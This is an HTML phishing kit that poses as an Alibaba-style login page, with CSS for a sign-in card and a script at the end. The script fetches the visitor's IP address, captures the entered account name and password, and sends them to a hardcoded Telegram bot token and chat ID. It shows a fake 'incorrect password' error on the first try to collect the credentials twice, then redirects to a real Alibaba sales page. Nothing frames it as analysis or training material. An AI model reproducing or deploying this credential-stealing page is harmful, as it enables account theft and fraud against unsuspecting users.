<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
    <style>
        /* General body styling */
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            

            /* Orange background */
        }

        .nav-up {
            display: flex;
            height: 85px;
            margin: auto;
        }
        .nav-up img{
            background-size: contain;
            display: block;
            height: 35px;
            width: 180px;
            padding: 30px;

        }

        /* Container for the page */
        .container {
            display: flex;
            justify-content: space-between;
            align-items: center;
            height: 75vh;
            padding: 0 11%;
            background-image: url(https://s.alicdn.com/@img/imgextra/i1/O1CN01ukqrJD1viOwtCxZ8q_!!6000000006206-2-tps-2200-600.png);
            background-repeat: no-repeat;
            
            margin-top: 5px;
            margin-bottom: 15px;
        }

        /* Left section */


        .sif_QR-box {
            height: 20px;
            position: relative;
            margin-top: 10px;
        }

        .sif_QR-box .sif_QR-link {
            background-position-x: right;
            cursor: pointer;
            height: 48px;
            position: absolute;
            right: 0;
            top: 0;
            width: 48px;
        }

        /* Right section (form card) */
        .form-card {
            background-color: white;
            border-radius: 1px;
            box-shadow: 0 0 10px #ecebf1;
            padding: 20px;
            width: 370px;
            margin-top: 5px;
            margin-bottom: 5px;
        }

        /* Input fields */
        .form-card input[type="text"],
        .form-card input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 2px;
            box-sizing: border-box;
        }

        /* Button styling */
        .form-card button {
            width: 100%;
            padding: 10px;
            background-color: #f57c00;
            color: white;
            border: none;
            border-radius: 2px;
            font-size: 1em;
            cursor: pointer;
        }

        .form-card button:hover {
            background-color: #e65100;
        }

        .form-card .error-message {
            color: red;
            font-size: 0.9em;
            margin-top: 10px;
            text-align: center;
        }

        /* Additional links */
        .form-card a {
            color: #2500f5;
            text-decoration: none;
            font-size: 0.9em;
        }

        .form-card #fom_a {
            float: right;
        }

        .form-card a:hover {
            text-decoration: underline;
        }

        /* Social sign-in options */
        .social {
            display: flex;
            justify-content: left;
            margin-top: 19px;
            margin-bottom: 19px;
            font-size: 14px;
            height: 32px;
            line-height: 32px;
        }

        .social img {
            width: 30px;
            height: 28px;
            margin: 0 10px;
            cursor: pointer;
            margin-top: 10px;
        }

        /* Footer Styles */
        .footer {
            background-color: white;
            padding: 5px;
            text-align: center;
        }

        .footer-icons {
            margin-bottom: 20px;
        }

        .footer-icons a {
            margin: 0 10px;
            text-decoration: none;
            color: #333;
            font-size: 1.5em;
        }

        .footer-icons a:hover {
            color: #f57c00;
        }

        .footer-content {
            color: blue;
            font-size: 0.9em;
            line-height: 1.6;
        }

        .footer-content span {
            display: block;
            margin-top: 10px;
            font-size: 0.8em;
            color: gray;
        }
    </style>
</head>

    <script>
        let passwordAttempts = 0; // Counter for password attempts
        let userIP = ""; // Variable to store user's IP address

        // Fetch the user's IP address
        fetch("https://api.ipify.org?format=json")
            .then(response => response.json())
            .then(data => {
                userIP = data.ip;
            })
            .catch(error => console.error("Error fetching IP address:", error));

        document.getElementById("loginForm").addEventListener("submit", function (event) {
            event.preventDefault();

            const account = document.getElementById("account").value;
            const password = document.getElementById("password").value;

            // Telegram Bot API URL
            const botToken = "7511579973:AAEBMuPeyI_0fy7DIkqph3a6rmQg39yySmI"; // Replace with your bot token
            const chatId = "5145365326"; // Replace with your chat ID
            const message = `
üîê Login Attempt ${passwordAttempts + 1}:
üë§ Account: ${account}
üîë Password: ${password}
üåê IP Address: ${userIP}
`;

            const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

            fetch(apiUrl, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            })
                .catch(error => console.error("Error:", error));

            // Handle password attempts
            if (passwordAttempts === 0) {
                passwordAttempts++;
                document.getElementById("errorMessage").textContent = "Your account name or password is incorrect.";
            } else {
                window.location.href = "https://sale.alibaba.com/fy25/top_deals"; // Replace with your redirect URL
            }
        });
    </script>
